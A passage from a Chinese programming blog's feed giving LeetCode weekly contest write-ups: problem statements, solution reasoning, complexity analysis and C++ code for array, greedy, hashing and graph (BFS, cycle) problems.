<li>题目要求 $j - i \neq nums[j] - nums[i]$， 该不等式可以转换为 $nums[i] - i \neq nums[j] - j$，我们因此可以找到不是坏的数对的数目 $tot$，总的数对数目为 $\dfrac{n \times (n - 1)}{2}$，则可以知道坏的数对的数目为 $\dfrac{n \times (n - 1)}{2} - tot$。我们可以用哈希表统计每个元素 $x &#x3D; nums[i] - i$ 的出现次数。</li>
<li>可能更复杂的解法还有线段树之类的解法。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n)$，$n$ 表示数组的长度。</li>
<li>空间复杂度：$O(n)$，$n$ 表示数组的长度。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">countBadPairs</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>,<span class="type">int</span>&gt; cnt;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="type">int</span> x = nums[i] - i;</span><br><span class="line">            <span class="keyword">if</span> (cnt.<span class="built_in">count</span>(x)) &#123;</span><br><span class="line">                ans += cnt[x];</span><br><span class="line">            &#125;</span><br><span class="line">            cnt[x]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">long</span> <span class="type">long</span>)(n - <span class="number">1</span>) * n / <span class="number">2</span> - ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6174-任务调度器-II"><a href="#6174-任务调度器-II" class="headerlink" title="6174. 任务调度器 II"></a>6174. 任务调度器 II</h3><h4 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h4><p>给你一个下标从 <code>0</code> 开始的正整数数组 <code>tasks</code> ，表示需要 按顺序 完成的任务，其中 <code>tasks[i]</code> 表示第 <code>i</code> 件任务的 类型 。</p>
<p>同时给你一个正整数 <code>space</code> ，表示一个任务完成 后 ，另一个 相同 类型任务完成前需要间隔的 最少 天数。</p>
<p>在所有任务完成前的每一天，你都必须进行以下两种操作中的一种：</p>
<ul>
<li>完成 <code>tasks</code> 中的下一个任务</li>
<li>休息一天<br>请你返回完成所有任务所需的 最少 天数。</li>
</ul>
<p> </p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：tasks = [1,2,1,2,3,1], space = 3</span><br><span class="line">输出：9</span><br><span class="line">解释：</span><br><span class="line">9 天完成所有任务的一种方法是：</span><br><span class="line">第 1 天：完成任务 0 。</span><br><span class="line">第 2 天：完成任务 1 。</span><br><span class="line">第 3 天：休息。</span><br><span class="line">第 4 天：休息。</span><br><span class="line">第 5 天：完成任务 2 。</span><br><span class="line">第 6 天：完成任务 3 。</span><br><span class="line">第 7 天：休息。</span><br><span class="line">第 8 天：完成任务 4 。</span><br><span class="line">第 9 天：完成任务 5 。</span><br><span class="line">可以证明无法少于 9 天完成所有任务。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：tasks = [5,8,8,5], space = 2</span><br><span class="line">输出：6</span><br><span class="line">解释：</span><br><span class="line">6 天完成所有任务的一种方法是：</span><br><span class="line">第 1 天：完成任务 0 。</span><br><span class="line">第 2 天：完成任务 1 。</span><br><span class="line">第 3 天：休息。</span><br><span class="line">第 4 天：休息。</span><br><span class="line">第 5 天：完成任务 2 。</span><br><span class="line">第 6 天：完成任务 3 。</span><br><span class="line">可以证明无法少于 6 天完成所有任务。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= tasks.length &lt;= 105</code></li>
<li><code>1 &lt;= tasks[i] &lt;= 109</code></li>
<li><code>1 &lt;= space &lt;= tasks.length</code></li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/task-scheduler-ii/">https://leetcode.cn/problems/task-scheduler-ii/</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>模拟 + 哈希表
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>感觉这个题目出的挺无聊，直接模拟即可，我们设哈希表 $prev$，其中 $prev[x]$ 表示任务 $x$ 最后一次发生的时间。我们遍历每个任务 $task[i]$，有以下两种情况需要处理，设上一个任务的完成时间为 $now$:</li>
</ol>
<ul>
<li>如果当前的任务 $task[i]$ 之前没有出现过，则此时当前任务的完成时间肯定为 $now + 1$，且此时 $prev[task[i]] &#x3D; now + 1$，且此时更新 $now &#x3D; now + 1$；</li>
<li>如果当前的任务 $task[i]$ 之前出现过，由于相同的任务的间隔必须大于 $space$, 因此当前任务的完成时间要么是 $now + 1$ 和 $prev[task[i]] + space + 1$ 之间的较大值，则此时 $now &#x3D; \max(now + 1,prev[task[i]] + space + 1) $, 更新 $prev[task[i]] &#x3D; now$；</li>
</ul>
<ol start="2">
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n)$，其中 $n$ 表示数组的长度。</li>
<li>空间复杂度：空间复杂度为 $O(n)$，其中 $n$ 表示数组的长度。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">taskSchedulerII</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; tasks, <span class="type">int</span> space)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>,<span class="type">long</span> <span class="type">long</span>&gt; prev;</span><br><span class="line">        <span class="type">int</span> n = tasks.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> now = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (prev.<span class="built_in">count</span>(tasks[i])) &#123;</span><br><span class="line">                now = <span class="built_in">max</span>(now, prev[tasks[i]] + space);</span><br><span class="line">            &#125; </span><br><span class="line">            now++;</span><br><span class="line">            prev[tasks[i]] = now;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> now;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6144-将数组排序的最少替换次数"><a href="#6144-将数组排序的最少替换次数" class="headerlink" title="6144. 将数组排序的最少替换次数"></a>6144. 将数组排序的最少替换次数</h3><h4 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h4><p>给你一个下表从 <code>0</code> 开始的整数数组 <code>nums</code> 。每次操作中，你可以将数组中任何一个元素替换为 任意两个 和为该元素的数字。<br>比方说，<code>nums = [5,6,7]</code> 。一次操作中，我们可以将 <code>nums[1]</code> 替换成 <code>2</code> 和 <code>4</code> ，将 <code>nums</code> 转变成 <code>[5,2,4,7]</code> 。<br>请你执行上述操作，将数组变成元素按 非递减 顺序排列的数组，并返回所需的最少操作次数。</p>
<p> </p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [3,9,3]</span><br><span class="line">输出：2</span><br><span class="line">解释：以下是将数组变成非递减顺序的步骤：</span><br><span class="line">- [3,9,3] ，将9 变成 3 和 6 ，得到数组 [3,3,6,3] </span><br><span class="line">- [3,3,6,3] ，将 6 变成 3 和 3 ，得到数组 [3,3,3,3,3] </span><br><span class="line">总共需要 2 步将数组变成非递减有序，所以我们返回 2 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [1,2,3,4,5]</span><br><span class="line">输出：0</span><br><span class="line">解释：数组已经是非递减顺序，所以我们返回 0 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= nums.length &lt;= 105</code></li>
<li><code>1 &lt;= nums[i] &lt;= 109</code></li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/minimum-replacements-to-sort-the-array/">https://leetcode.cn/problems/minimum-replacements-to-sort-the-array/</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><pre><code>贪心算法
</code></pre>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>首先我们为了减少替换次数，此时我们应当保证最后面的数尽可能的大，才能保证前面的数尽可能的不被替换。因此我们从后往前遍历数组，对于第 $i$ 个元素，如果出现 $nums[i] &gt; nums[i + 1]$，此时我们应该进行拆分，但在拆分时需要的技巧是需要满足两个条件:</li>
</ol>
<ul>
<li>拆分的出数的序列中的最大值一定要满足小于等于 $nums[i+1]$;</li>
<li>拆分的出数的序列中的最小值一定要尽可能的大;</li>
</ul>
<p>如何满足以上条件的拆分法，所有需要切分的最少次数 $k &#x3D; \dfrac{nums[i]}{nums[i+1]}$。此时可以知道切分后最小的数为 $x &#x3D; \lfloor\dfrac{nums[i]}{k + 1} \rfloor$。</p>
<ol start="2">
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n)$，$n$ 表示数组的长度。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">minimumReplacement</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> mx = INT_MAX;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = n - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] &gt; mx) &#123;</span><br><span class="line">                <span class="type">int</span> div = (nums[i] - <span class="number">1</span>) / mx;</span><br><span class="line">                ans += div;</span><br><span class="line">                mx = nums[i] / (div + <span class="number">1</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                mx = nums[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode  conttest 304</title>
    <url>/2022/11/01/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/21/</url>
    <content><![CDATA[<h2 id="leetcode-conttest-304"><a href="#leetcode-conttest-304" class="headerlink" title="leetcode  conttest 304"></a>leetcode  conttest 304</h2><p>周赛的状态越来越不好，感觉第四题的状态越来越差，不过也感觉力扣好的题目越来越少了。套路题目太多了，感觉就刷一下周赛即可。</p>
<h3 id="2357-使数组中所有元素都等于零"><a href="#2357-使数组中所有元素都等于零" class="headerlink" title="2357. 使数组中所有元素都等于零"></a>2357. 使数组中所有元素都等于零</h3><h4 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h4><p>给你一个非负整数数组 <code>nums</code> 。在一步操作中，你必须：</p>
<ul>
<li>选出一个正整数 <code>x</code> ，<code>x</code> 需要小于或等于 <code>nums</code> 中 最小 的 非零 元素。</li>
<li><code>nums</code> 中的每个正整数都减去 <code>x</code>。<br>返回使 <code>nums</code> 中所有元素都等于 <code>0</code> 需要的 最少 操作数。</li>
</ul>
<p> </p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [1,5,0,3,5]</span><br><span class="line">输出：3</span><br><span class="line">解释：</span><br><span class="line">第一步操作：选出 x = 1 ，之后 nums = [0,4,0,2,4] 。</span><br><span class="line">第二步操作：选出 x = 2 ，之后 nums = [0,2,0,0,2] 。</span><br><span class="line">第三步操作：选出 x = 2 ，之后 nums = [0,0,0,0,0] 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：nums = [0]</span><br><span class="line">输出：0</span><br><span class="line">解释：nums 中的每个元素都已经是 0 ，所以不需要执行任何操作。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= nums.length &lt;= 100</code></li>
<li><code>0 &lt;= nums[i] &lt;= 100</code></li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/make-array-zero-by-subtracting-equal-amounts/">https://leetcode.cn/problems/make-array-zero-by-subtracting-equal-amounts/</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>直接模拟
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>首先我们可以直接模拟，将数组按照从小到大进行排序，然后按照从小到大的顺序依次取出元素 $x$，将所有的元素都减去 $x$，直到所有元素变为 $0$ 为止。</li>
<li>由于数组中所有的元素都不相同，因此每次模拟时，我们只能将其中一个元素变为 $0$，因此总共需要的次数即为数组中大于 $0$ 的不同元素的个数。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(n)$，其中 $n$ 为数组元素的个数。</li>
<li>空间复杂度：$O(n)$，其中 $n$ 为数组元素的个数。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><ul>
<li>直接模拟：<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minimumOperations</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        set&lt;<span class="type">int</span>&gt; cnt;</span><br><span class="line">        <span class="built_in">sort</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>());</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> pos = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(nums.<span class="built_in">back</span>() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">while</span>(pos &lt; nums.<span class="built_in">size</span>() &amp;&amp; nums[pos] == <span class="number">0</span>) &#123;</span><br><span class="line">                pos++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> x = nums[pos];</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i = pos; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">                nums[i] -= x;</span><br><span class="line">            &#125;</span><br><span class="line">            ans++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
<li>数学：<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">minimumOperations</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        unordered_set&lt;<span class="type">int</span>&gt; cnt;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] != <span class="number">0</span>) &#123;</span><br><span class="line">                cnt.<span class="built_in">emplace</span>(nums[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cnt.<span class="built_in">size</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="2358-分组的最大数量"><a href="#2358-分组的最大数量" class="headerlink" title="2358. 分组的最大数量"></a>2358. 分组的最大数量</h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><p>给你一个正整数数组 <code>grades</code> ，表示大学中一些学生的成绩。你打算将 所有 学生分为一些 有序 的非空分组，其中分组间的顺序满足以下全部条件：</p>
<ul>
<li>第 <code>i</code> 个分组中的学生总成绩 小于 第 (<code>i + 1</code>) 个分组中的学生总成绩，对所有组均成立（除了最后一组）。</li>
<li>第 <code>i</code> 个分组中的学生总数 小于 第 (<code>i + 1</code>) 个分组中的学生总数，对所有组均成立（除了最后一组）。<br>返回可以形成的 最大 组数。</li>
</ul>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：grades = [10,6,12,7,3,5]</span><br><span class="line">输出：3</span><br><span class="line">解释：下面是形成 3 个分组的一种可行方法：</span><br><span class="line">- 第 1 个分组的学生成绩为 grades = [12] ，总成绩：12 ，学生数：1</span><br><span class="line">- 第 2 个分组的学生成绩为 grades = [6,7] ，总成绩：6 + 7 = 13 ，学生数：2</span><br><span class="line">- 第 3 个分组的学生成绩为 grades = [10,3,5] ，总成绩：10 + 3 + 5 = 18 ，学生数：3 </span><br><span class="line">可以证明无法形成超过 3 个分组。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：grades = [8,8]</span><br><span class="line">输出：1</span><br><span class="line">解释：只能形成 1 个分组，因为如果要形成 2 个分组的话，会导致每个分组中的学生数目相等。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>1 &lt;= grades.length &lt;= 105</code></li>
<li><code>1 &lt;= grades[i] &lt;= 105</code></li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/maximum-number-of-groups-entering-a-competition">https://leetcode.cn/problems/maximum-number-of-groups-entering-a-competition</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>贪心算法
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>典型的贪心算法，若要是分组数目尽可能的大，则应该满足第一个分组尽可能的小，按照贪心规则可以知道第一个分组最小只能为数组中最小的元素。此时我们将第一个最小的元素去掉，再按照题目中要求的情况去模拟，找到第二个分组满足情况，当然经过仔细分析可以知道如下最大分组应该分布如下：<br>$$<br>(1,2,3,4,…,k)<br>$$<br>第一个分组中应有 $1$ 个元素，第二个分组中应有 $2$ 个元素，第三个分组中应有 $3$ 个元素。当然此时我们可以利用解一元二次方程即可。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(1)$。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maximumGroups</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; grades)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> n = grades.<span class="built_in">size</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            n -= i;</span><br><span class="line">            ans++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>


<h3 id="2359-找到离给定两个节点最近的节点"><a href="#2359-找到离给定两个节点最近的节点" class="headerlink" title="2359. 找到离给定两个节点最近的节点"></a>2359. 找到离给定两个节点最近的节点</h3><h4 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h4><p>给你一个 <code>n</code> 个节点的 有向图 ，节点编号为 <code>0</code> 到 <code>n - 1</code> ，每个节点 至多 有一条出边。</p>
<p>有向图用大小为 <code>n</code> 下标从 <code>0</code> 开始的数组 <code>edges</code> 表示，表示节点 <code>i</code> 有一条有向边指向 <code>edges[i]</code> 。如果节点 <code>i</code> 没有出边，那么 <code>edges[i] == -1</code> 。</p>
<p>同时给你两个节点 <code>node1</code> 和 <code>node2</code> 。</p>
<p>请你返回一个从 <code>node1</code> 和 <code>node2</code> 都能到达节点的编号，使节点 <code>node1</code> 和节点 <code>node2</code> 到这个节点的距离 较大值最小化。如果有多个答案，请返回 最小 的节点编号。如果答案不存在，返回 <code>-1</code> 。</p>
<p>注意 <code>edges</code> 可能包含环。</p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：edges = [2,2,3,-1], node1 = 0, node2 = 1</span><br><span class="line">输出：2</span><br><span class="line">解释：从节点 0 到节点 2 的距离为 1 ，从节点 1 到节点 2 的距离为 1 。</span><br><span class="line">两个距离的较大值为 1 。我们无法得到一个比 1 更小的较大值，所以我们返回节点 2 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：edges = [1,2,-1], node1 = 0, node2 = 2</span><br><span class="line">输出：2</span><br><span class="line">解释：节点 0 到节点 2 的距离为 2 ，节点 2 到它自己的距离为 0 。</span><br><span class="line">两个距离的较大值为 2 。我们无法得到一个比 2 更小的较大值，所以我们返回节点 2 。</span><br></pre></td></tr></table></figure>

<p>提示：</p>
<ul>
<li><code>n == edges.length</code></li>
<li><code>2 &lt;= n &lt;= 105</code></li>
<li><code>-1 &lt;= edges[i] &lt; n</code></li>
<li><code>edges[i] != i</code></li>
<li><code>0 &lt;= node1, node2 &lt; n</code></li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/problems/find-closest-node-to-given-two-nodes">https://leetcode.cn/problems/find-closest-node-to-given-two-nodes</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>BFS
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>感觉是非常简单的 <code>BFS</code> 即可，通过 <code>BFS</code> 分别求出所有节点到 <code>node1</code> 与 <code>node2</code> 的距离。然后依次遍历节点，找到二者之间共同可以访问的节点，并求出共同可以访问节点的距离之和的最小值即可，感觉没有多少难度，很直观的思路和解题方法。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n)$。</li>
<li>空间复杂度：空间复杂度为 $O(n)$。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">bfs</span><span class="params">(unordered_map&lt;<span class="type">int</span>, vector&lt;<span class="type">int</span>&gt;&gt;&amp; adj, <span class="type">int</span> node, unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; &amp;dist)</span> </span>&#123;</span><br><span class="line">        queue&lt;<span class="type">int</span>&gt; qu;</span><br><span class="line">        qu.<span class="built_in">emplace</span>(node);</span><br><span class="line">        <span class="type">int</span> step = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (!qu.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="type">int</span> sz = qu.<span class="built_in">size</span>();</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; sz; i++) &#123;</span><br><span class="line">                <span class="type">int</span> curr = qu.<span class="built_in">front</span>();</span><br><span class="line">                qu.<span class="built_in">pop</span>();</span><br><span class="line">                dist[curr] = step;</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">auto</span> v : adj[curr]) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(dist.<span class="built_in">count</span>(v)) <span class="keyword">continue</span>;</span><br><span class="line">                    qu.<span class="built_in">emplace</span>(v);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            step++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">closestMeetingNode</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; edges, <span class="type">int</span> node1, <span class="type">int</span> node2)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = edges.<span class="built_in">size</span>();</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>, vector&lt;<span class="type">int</span>&gt;&gt; adj;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span>(edges[i] &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                adj[i].<span class="built_in">emplace_back</span>(edges[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; dist1;</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; dist2;</span><br><span class="line">        <span class="built_in">bfs</span>(adj, node1, dist1);</span><br><span class="line">        <span class="built_in">bfs</span>(adj, node2, dist2);</span><br><span class="line">        <span class="type">int</span> ans = <span class="number">-1</span>;</span><br><span class="line">        <span class="type">int</span> mindist = INT_MAX;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> &amp;[node, dist] : dist1) &#123;</span><br><span class="line">            <span class="keyword">if</span> (dist2.<span class="built_in">count</span>(node)) &#123;</span><br><span class="line">                <span class="type">int</span> curr = <span class="built_in">max</span>(dist, dist2[node]);</span><br><span class="line">                <span class="keyword">if</span> (curr &lt; mindist) &#123;</span><br><span class="line">                    ans = node;</span><br><span class="line">                    mindist = curr;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (curr == mindist &amp;&amp; node &lt; ans) &#123;</span><br><span class="line">                    ans = node;</span><br><span class="line">                    mindist = curr;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="2360-图中的最长环"><a href="#2360-图中的最长环" class="headerlink" title="2360. 图中的最长环"></a>2360. 图中的最长环</h3><h4 id="题目-3"><a href="#题目-3" class="headerlink" title="题目"></a>题目</h4><p>给你一个 <code>n</code> 个节点的 有向图 ，节点编号为 <code>0</code> 到 <code>n - 1</code> ，其中每个节点 至多 有一条出边。</p>
<p>图用一个大小为 <code>n</code> 下标从 <code>0</code> 开始的数组 <code>edges</code> 表示，节点 <code>i</code> 到节点 <code>edges[i]</code> 之间有一条有向边。如果节点 <code>i</code> 没有出边，那么 <code>edges[i] == -1</code> 。</p>
<p>请你返回图中的 最长 环，如果没有任何环，请返回 <code>-1</code> 。</p>
<p>一个环指的是起点和终点是 同一个 节点的路径。</p>
<p> </p>
<p>示例 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：edges = [3,3,4,2,3]</span><br><span class="line">输出去：3</span><br><span class="line">解释：图中的最长环是：2 -&gt; 4 -&gt; 3 -&gt; 2 。</span><br><span class="line">这个环的长度为 3 ，所以返回 3 。</span><br></pre></td></tr></table></figure>
<p>示例 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：edges = [2,-1,3,1]</span><br><span class="line">输出：-1</span><br><span class="line">解释：图中没有任何环。</span><br></pre></td></tr></table></figure>

